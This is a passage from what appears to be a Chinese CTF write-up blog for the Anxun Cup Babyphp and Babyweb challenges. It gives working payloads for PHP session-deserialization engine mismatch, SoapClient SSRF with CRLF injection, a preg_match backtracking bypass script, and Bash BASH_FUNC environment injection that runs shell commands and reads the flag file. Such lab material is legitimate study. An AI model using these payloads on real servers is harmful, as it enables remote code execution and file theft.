+<li>然后<code>$_SESSION[&#39;sess&#39;] = $_POST[&#39;sess&#39;];</code>这里允许我们设置一个sess变量的session，也就对应<code>call_user_func</code>里面的<code>call_user_func(array(reset($_SESSION), $this-&gt;a));</code>中的<code>reset($_SESSION)</code>这个时候我们让sess为SoapClient这个类，a随便取一个不存在的函数，则原来这句话就变成了<code>call_user_func(SoapClient-&gt;aaa));</code>，就能成功触发soapcilent-&gt;__call从而进行ssrf。</li>
+<li>现在就是想办法通过pop链触发<code>call_user_func(array(reset($_SESSION), $this-&gt;a));</code>从而ssrf。</li>
+<li>这个时候就是运用session的机制</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a = new SoapClient(null, array(&#x27;location&#x27; =&gt; &#x27;uri&#x27; =&gt; &#x27;http://127.0.0.1/&#x27;,&#x27;http://127.0.0.1/flag.php?a=GlobIterator&amp;b=/f*&#x27; ));            </span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">//利用SoapClient调用__call来发起http请求访问flag.php，绕过only localhost的限制</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>我们先利用crlf伪造请求去访问flag.php并将结果保存在cookie为session&#x3D;【执行后的sessionID】中</li>
+<li>于是我们先传sess为上述的poc【注意格式 <code>序列化内容</code>】</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#x27;d0g3&#x27;])) &#123;             </span><br><span class="line">    ini_set($_GET[&#x27;baby&#x27;], $_GET[&#x27;d0g3&#x27;]);  //ini_set(&#x27;session.serialize_handler&#x27;, &#x27;设置的引擎&#x27;);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&#x27;sess&#x27;] = $_POST[&#x27;sess&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    session_start();</span><br><span class="line">    if (isset($_POST[&quot;pop&quot;])) &#123;</span><br><span class="line">        unserialize($_POST[&quot;pop&quot;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>首先是进入第一个if语句，sess传进去，然后不传dog3</li>
+<li>就会进入else，先session start读取我们传的sess，并且反序列化pop，我们这个时候传构造的链子，触发call_user_func，里面的reset(session)就是我们构造的SoapClient咯</li>
+<li>于是成功获得flag，存进一个新的session里面</li>
+<li>复制一下seesion，访问index.php，输出flag</li>
+</ul>
+<hr>
+<h6 id="抄：hurrison佬的wp"><a href="#抄：hurrison佬的wp" class="headerlink" title="抄：hurrison佬的wp"></a>抄：hurrison佬的wp</h6><p>查看 phpinfo发现session.serialize_handler&#x3D;php，<code>ini_set($_GET[&#39;baby&#39;], $_GET[&#39;d0g3&#39;]);</code>可以设置 php_serialize</p>
+<p>利用session序列化不一致，根据flag.php， 构造$_SESSION[‘sess’] 对象，到 call_user_func(…) 执行，那么可以用 SoapClient 调用任意不存在的方法造成ssrf访问flag.php</p>
+<p>首先根据提示，利用GlobIterator查找根目录文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a = new SoapClient(null, array(&#x27;location&#x27; =&gt; &#x27;uri&#x27; =&gt; &#x27;http://127.0.0.1/&#x27;,&#x27;http://127.0.0.1/flag.php?a=GlobIterator&amp;b=/f*&#x27; ));            </span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">//利用SoapClient调用__call来发起http请求访问flag.php，绕过only localhost的限制</span><br></pre></td></tr></table></figure>
+
+<p>通过 <code>var_dump($_SESSION);</code> 拿到 sessionid 设置后再访问，拿到flag文件名 <code>f1111llllllaagg</code></p>
+<p>另解：<code>new DirextoryIterator(&#39;glod://f*&#39;)</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230707013038305-1024x357.png"></p>
+<p>再利用SplFileObject读flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a = new SoapClient(null, array(&#x27;location&#x27; =&gt; &#x27;http://127.0.0.1/flag.php?a=SplFileObject&amp;b=/f1111llllllaagg&#x27;, &#x27;uri&#x27; =&gt; &#x27;http://127.0.0.1/&#x27;));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br></pre></td></tr></table></figure>
+
+<h6 id="官方wp"><a href="#官方wp" class="headerlink" title="官方wp"></a>官方wp</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?baby=session.serialize_handler&amp;d0g3=php_serialize</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*读文件名*/</span><br><span class="line">$target = &quot;http://127.0.0.1/flag.php?a=DirectoryIterator&amp;b=glob:///f*&quot;;</span><br><span class="line">/*读文件内容*/</span><br><span class="line">//$target = &quot;http://127.0.0.1/flag.php?a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=/f1111llllllaagg&quot;;</span><br><span class="line"> </span><br><span class="line">$attack = new SoapClient(null,array(</span><br><span class="line">    &#x27;location&#x27;=&gt;$target,</span><br><span class="line">    &#x27;uri&#x27;=&gt;&#x27;http://127.0.0.1&#x27;,</span><br><span class="line">    &#x27;user_agent&#x27;=&gt;&quot;test\r\nCookie: PHPSESSID=vidkft3g6sgv3vbbbd5qu9aitk&quot;));</span><br><span class="line">$payload = urlencode(serialize($attack));</span><br><span class="line">echo &#x27;&#x27;.$payload;</span><br><span class="line">//POST:</span><br><span class="line">//sess=O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A16%3A%22http%3A%2F%2F127.0.0.1%22%3Bs%3A8%3A%22location%22%3Bs%3A58%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%3Fa%3DDirectoryIterator%26b%3Dglob%3A%2F%2F%2Ff%2A%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A50%3A%22test%0D%0ACookie%3A+PHPSESSID%3Du1um0t3pnp8sg1sc8d25ueidpp%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure>
+
+<p>流程就是在index.php中利用session反序列化漏洞上传构造好的sess，然后sess里面的反序列化首先是利用SoapClient来造成ssrf以localhost的身份请求flag.php的内容，并且在flag.php中</p>
+<p>1.先是利用DirectoryIterator这个类来查找flag文件的文件名[已知文件在根目录]。</p>
+<p>2.利用SplFileObject和filter伪协议来读取文件内容，也就是flag的内容。</p>
+<p>现在的目标就是想办法调用SoapClient里面的__Call，所以我们考虑利用之前pop链里面的call_user_func来调用随便一个函数触发call。也就是说我们随便写一个a，然后传入我们的链子，把返回的seesionID写进去，访问index.php，就成功看到flag。</p>
+<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><h5 id="session-反序列化机制"><a href="#session-反序列化机制" class="headerlink" title="session 反序列化机制"></a><strong>session 反序列化机制</strong></h5><blockquote>
+<p>在php.ini中存在session.serialize_handler配置，定义用来序列化&#x2F;反序列化的<strong>处理器</strong>名字，默认使用php。<br>php中的session中的内容是以文件的方式来存储的<br>存储方式由配置项session.save_handler确定，默认是以文件的方式存储。</p>
+</blockquote>
+<h5 id="机制"><a href="#机制" class="headerlink" title="机制"></a>机制</h5><p>在PHP中session有两种<strong>机制</strong>，分别为默认机制和由用户自定义session处理机制。</p>
+<h6 id="默认机制"><a href="#默认机制" class="headerlink" title="默认机制"></a>默认机制</h6><p>在php.ini中有如下配置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.save_handler = file</span><br></pre></td></tr></table></figure>
+
+<p>即，是用磁盘文件来实现PHP会话，它有以下几部分组成：</p>
+<p><strong>session_start()</strong></p>
+<p>session_start()是<strong>session机制的开始</strong>，它具有一定概率开启垃圾回收。这个概率是根据php.ini的配置决定的，因为在有的系统中session.gc_probability &#x3D; 0,即概率是0，这时就不具备垃圾回收</p>
+<p><strong>为$_session赋值</strong></p>
+<p>添加一个新值只会维持在<strong>内存</strong>中，当脚本执行结束的时候，把$_session的值写入到session_id指定的<strong>文件夹</strong>中，然后关闭相关资源。这个阶段有可能执行更改session_id的操作，比如销毁一个旧的session_id，生成一个全新的session_id。这一般用在自定义session操作</p>
+<p><strong>写入session操作</strong></p>
+<p>在脚本结束的时候会执行<strong>session写入操作</strong>，把$_session中的值写入到session_id命名的文件中，可能已经存在，可能需要创建新的文件。</p>
+<p><strong>销毁session</strong></p>
+<p>session发出去的cookie一般是<strong>即时cookie</strong>，保存在内存中，当浏览器关闭后，才会过期，但是如果只是想退出登录，而不是关闭浏览器，那么就需要在代码里销毁session，方法有很多。</p>
+<ul>
+<li>setcookies(session_name(),session_id(),time()-8000000,..) <strong>退出登录前执行</strong></li>
+<li>usset($_SESSION); &#x2F;&#x2F;删除所有的$_SEESION数据，刷新后，有cookie传过来但是没有数据</li>
+<li>session_destroy(); &#x2F;&#x2F;这个作用更彻底，删除$_SESSION 删除session文件 和session_id</li>
+</ul>
+<h6 id="用户自定义session处理机制"><a href="#用户自定义session处理机制" class="headerlink" title="用户自定义session处理机制"></a>用户自定义session处理机制</h6><p>在php.ini中有如下配置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.save_handler = user</span><br></pre></td></tr></table></figure>
+
+<p><strong>session_start()</strong></p>
+<p>执行open($save_path,$session_name)语句打开session操作句柄执行read($id)从中读取数据</p>
+<p><strong>注意</strong>：$save_path在此情况下直接返回true</p>
+<p><strong>脚本执行结束</strong></p>
+<p>执行write($id,$sess_data)语句</p>
+<p><strong>销毁session</strong></p>
+<p>需要注意如果用户需要销毁session则要先执行destroy再执行第2步</p>
+<h5 id="引擎"><a href="#引擎" class="headerlink" title="引擎"></a>引擎</h5><p><code>session.serialize_handler</code>是用来设置session的序列话<strong>引擎</strong>的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。</p>
+<ul>
+<li><strong>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</strong></li>
+<li><strong>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</strong></li>
+<li><strong>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</strong></li>
+</ul>
+<p>在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码<code>ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;);</code></p>
+<blockquote>
+<p>PHP中session本身的序列化<strong>机制</strong>是没有问题的<br>问题出在了如果在序列化和反序列化时选择的<strong>引擎不同</strong>，就会带来安全问题<br>当使用php引擎的时候，php引擎会以作为作为key和value的分隔符，对value多进行一次反序列化，达到我们触发反序列化的目的</p>
+</blockquote>
+<h5 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h5><p>存在s1.php和us2.php,两个文件所使用的的session引擎不一样，就形成了一个漏洞。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//s1.php中，使用php_serilise来处理session。</span><br><span class="line">//php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</span><br><span class="line">&lt;?php</span><br><span class="line">    ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&quot;spoock&quot;]=$_GET[&quot;a&quot;];</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//us2.php中，用php来处理session</span><br><span class="line">//php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">classlemon&#123;</span><br><span class="line">    var$hi;</span><br><span class="line">    function__construct()&#123;</span><br><span class="line">            $this-&gt;hi=&#x27;phpinfo();&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function__destruct()&#123;</span><br><span class="line">        eval($this-&gt;hi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在我们访问s1,php时，构造如下payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locallhost/s1.php?a=O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传进去的 a 在s1.php中进行序列化，引擎是php_serialize，</p>
+<p>所以最后存储的内容是：</p>
+<p><code>a:1:&#123;s:6:&quot;spoock&quot;;s:48:&quot;O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;&quot; &#125;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221201175904124-1-1024x227.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221201175845894-1-1024x91.png"></p>
+<p>然而，在us2.php中，我们读取数据却选择的php，此时读取的内容就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [a:1:&#123;s:6:&quot;spoock&quot;;s:48:&quot;] =&gt; __PHP_Incomplete_Class Object</span><br><span class="line">        (</span><br><span class="line">            [__PHP_Incomplete_Class_Name] =&gt; lemon</span><br><span class="line">            [hi] =&gt; echo &quot;spoock&quot;;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [spoock] =&gt; O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>因为我们使用PHP引擎的时候，PHP引擎会用 作为 key 和 value 的分隔符，就会将<code> `a:1:&#123;s:6:&quot;spoock&quot;;s:48:&quot;</code>作为session的key，将<code>O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;&quot; &#125;</code>作为value，进行反序列化的时候就会得到lemon这个类。</p>
+<p>那么我们访问us2.php的时候，就会执行我们写入的echo spock这个操作。</p>
+<h5 id="PHP原生类的利用"><a href="#PHP原生类的利用" class="headerlink" title="PHP原生类的利用"></a>PHP原生类的利用</h5><blockquote>
+<p>引言：文章围绕着一个问题，如果在代码审计中有反序列化点，但是在原本的代码中找不到pop链该如何?</p>
+</blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0">反序列化之PHP原生类的利用</a></p>
+<p><strong>SoapClient</strong></p>
+<p>这个也算是目前被挖掘出来最好用的一个内置类，php5、7都存在此类。这个内置类里面也有一些自带的魔术方法，比如，__call.可以反序列化这个内置类然后通过一些方法来调用魔法函数来达到目的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new SoapClient(null,array(&#x27;uri&#x27;=&gt;&#x27;http://example.com:5555&#x27;, &#x27;location&#x27;=&gt;&#x27;http://example.com:5555/aaa&#x27;));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;not_exists_function();</span><br><span class="line">             //调用了c里面不存在的函数a，跳进c也就是SoapClient里面的__call()</span><br><span class="line">             //发现SOAPAction参数可控，可以在SOAPAction处注入恶意的换行</span><br><span class="line">             //这样一来我们POST提交的header就是可控的，我们就可以通过注入来执行我们想要执行的操作了。(CRLF)</span><br></pre></td></tr></table></figure>
+
+<h5 id="CRLF攻击"><a href="#CRLF攻击" class="headerlink" title="CRLF攻击"></a>CRLF攻击</h5><p>什么是<strong>CRLF</strong>，其实就是回车和换行造成的漏洞，十六进制为<code>0x0d,0x0a</code> ，在HTTP当中<code>header</code>和<code>body</code>之间就是两个CRLF分割的，所以如果我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样就能注入一些会话cookie和html代码，所以crlf injection 又叫做 HTTP Response Splitting。</p>
+<p>其实就是利用http请求的固定格式要求来植入恶意代码。</p>
+<p>soap：简单对象访问协议； -》底层通讯逻辑为http</p>
+<p>因此可以通过<strong>控制soapaction的参数</strong>，在SOAPAction处注入恶意的<strong>换行</strong>，这样一来我们POST提交的header就是可控的，我们就可以通过注入来执行我们想要执行的操作了。</p>
+<hr>
+<h2 id="Babyweb-2023安洵杯春季赛"><a href="#Babyweb-2023安洵杯春季赛" class="headerlink" title="Babyweb(2023安洵杯春季赛)"></a>Babyweb(2023安洵杯春季赛)</h2><p>两个PHP</p>
+<h3 id="PHP1-0"><a href="#PHP1-0" class="headerlink" title="PHP1.0"></a>PHP1.0</h3><h5 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h5><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230308203346357.png"></p>
+<h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>需要post一个heizi，作为变量a</p>
+<p>a的前五项是aikun</p>
+<p>a的最后十项是xiaojijiao</p>
+<p>中间加东西</p>
+<p>目标是绕过：<code>preg_match(&#39;/aikun+?xiaojijiao/is&#39;,$a)</code>,不能让这个条件满足，但是实际上传的a又必须是这个形式的。就有一个知识点：grep_match回溯次数绕过</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yourdawntown/article/details/120558237">正则回溯次数绕过</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/12198258.html">preg_match绕过总结</a></p>
+<p>.+?是惰性匹配，正则匹配会尽可能少的去匹配。回溯匹配指先对目标字符串顺序匹配，匹配到目标之后再倒回去看上一个匹配的。</p>
+<p>最新的PHP文档里规定了正则匹配最大回溯次数是一百万也就是1000000，超过这个值就不再回溯。</p>
+<p>对于本题如果中间有1000000个其他字符，则匹配到最后一个时开始回溯，回溯到第一百万停止回溯，此时还没回溯到应该匹配的哪一个字符，函数返回匹配失败，成功绕过。</p>
+<h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> #!/usr/bin/env python</span><br><span class="line"> # -*- coding:utf-8 -*-</span><br><span class="line"> # auther:psych</span><br><span class="line"> # time:2023/3/1</span><br><span class="line"> ​</span><br><span class="line"> import requests</span><br><span class="line"> import re</span><br><span class="line"> url = &#x27;http://182.148.156.200:9134/&#x27;</span><br><span class="line"> a = requests.Session()</span><br><span class="line"> payload = &#123;&#x27;heizi&#x27;: &quot;aikun&quot; + &quot;a&quot;*1000000 + &quot;xiaojijiao&quot;&#125;      //注意回溯上限是一百万</span><br><span class="line"> print(a.post(url, payload).text)</span><br></pre></td></tr></table></figure>
+
+<h3 id="PHP2-0"><a href="#PHP2-0" class="headerlink" title="PHP2.0"></a>PHP2.0</h3><p>找不到源码了，具体的关键的代码就一句，类似下面这个：</p>
+<h5 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> foreach($_REQUEST[&#x27;envs&#x27;] as $key =&gt; $val) &#123;</span><br><span class="line">     putenv(&quot;&#123;$key&#125;=&#123;$val&#125;&quot;);</span><br><span class="line"> &#125;</span><br><span class="line"> //... 一些其他代码</span><br><span class="line"> system(&#x27;echo hello&#x27;);</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>有两个可疑点：</p>
+<blockquote>
+<ul>
+<li>envs,环境变量应该是其中一个突破口</li>
+<li>一个echo函数本来可以直接写，结果非要套一个system。。肯定有问题</li>
+</ul>
+</blockquote>
+<p>首先是关于环境变量的一些思考。</p>
+<h5 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jeff_12138/article/details/124815448">LD_PRELOAD环境变量注入</a></p>
+<blockquote>
+<p>LD_PRELOAD是Linux系统的一个<strong>环境变量</strong>，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p>
+</blockquote>
+<blockquote>
+<p>用人话讲，LD_PRELOAD，是个环境变量，用于动态库的加载，而动态库加载的优先级最高，因此我们可以<strong>抢先在正常函数执行之前率先执行我们的用代码写的函数</strong>。</p>
+</blockquote>
+<p>因此我们能利用LD_PRELOAD劫持并<strong>执行任意代码</strong>。但遗憾的是，这里没有上传点，我们压根就不可能整个LD_PRELOAD&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;hj.jpg上去。这就是如今的问题所在，怎么在<strong>没有给上传接口</strong>的情况下get shell。</p>
+<h5 id="环境变量注入"><a href="#环境变量注入" class="headerlink" title="环境变量注入"></a>环境变量注入</h5><p><a target="_blank" rel="noopener" href="https://www.ctfiot.com/26843.html">https://www.ctfiot.com/26843.html</a></p>
+<p>在大佬的博客中看了半天没看懂，只能说羡慕Linux内核玩家。最后抄个结论：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230309075600961.png"></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ziyunfei/p/4828767.html">bash从环境变量中导入函数</a></p>
+<p>省流：</p>
+<ul>
+<li>Bash 把满足 “BASH_FUNC_函数名%%＝(){ 函数体}格式的环境变量作为函数源码解析并导入</li>
+<li>然而，本文所讲的表现仅适用于 Bash 4.3.30 及之后的版本，之前的 Bash 版本在导出函数时不会给函数名加上 BASH_FUNC_ 前缀和 %% 后缀，在导入时也不会识别前缀后缀，只要看到 ＝ 右边是 “() {“ 这四个字符，就按函数导入</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230309085711588-1024x196.png"></p>
+<p>而这个题还没有那么简单，</p>
+<blockquote>
+<p>只不过和4.4以下的有一处差异：**Bash 4.4下FUNCDEF_SUFFIX等于%%，而这个4.2的补丁中FUNCDEF_SUFFIX等于()**。</p>
+</blockquote>
+<p>也就是说上面大佬的payload还要更改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> env=[BASH_FUNC_echo()]() &#123; id; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后执行了id，现在的问题是执行找到flag并输出。</p>
+<p>原题目还加上了一些黑名单，cat和flag都被限制，就用字符串拼接绕过，因为内部是PHP代码，PHP字符串可以拼接。</p>
+<h5 id="最终payload"><a href="#最终payload" class="headerlink" title="最终payload"></a>最终payload</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> env[BASH_FUNC_echo()]=()%20&#123;%20c=ca;d=t;a=fl;b=ag;$c$d%20/$a$b;%20&#125;</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Article</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Babyphp-2022%E5%AE%89%E6%B4%B5%E6%9D%AF"><span class="toc-number">1.</span> <span class="toc-text">Babyphp(2022安洵杯)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BabyPHP"><span class="toc-number">2.</span> <span class="toc-text">BabyPHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pop%E9%93%BE"><span class="toc-number">2.1.</span> <span class="toc-text">pop链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pop%E9%93%BE-1"><span class="toc-number">2.1.1.</span> <span class="toc-text">pop链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0exp"><span class="toc-number">2.1.2.</span> <span class="toc-text">构造exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.2.</span> <span class="toc-text">session反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.2.0.0.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%8A%84%EF%BC%9Ahurrison%E4%BD%AC%E7%9A%84wp"><span class="toc-number">2.2.0.0.2.</span> <span class="toc-text">抄：hurrison佬的wp</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%98%E6%96%B9wp"><span class="toc-number">2.2.0.0.3.</span> <span class="toc-text">官方wp</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">2.3.</span> <span class="toc-text">补充</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6"><span class="toc-number">2.3.0.1.</span> <span class="toc-text">session 反序列化机制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%BA%E5%88%B6"><span class="toc-number">2.3.0.2.</span> <span class="toc-text">机制</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E6%9C%BA%E5%88%B6"><span class="toc-number">2.3.0.2.1.</span> <span class="toc-text">默认机制</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E8%87%AA%E5%AE%9A%E4%B9%89session%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6"><span class="toc-number">2.3.0.2.2.</span> <span class="toc-text">用户自定义session处理机制</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BC%95%E6%93%8E"><span class="toc-number">2.3.0.3.</span> <span class="toc-text">引擎</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 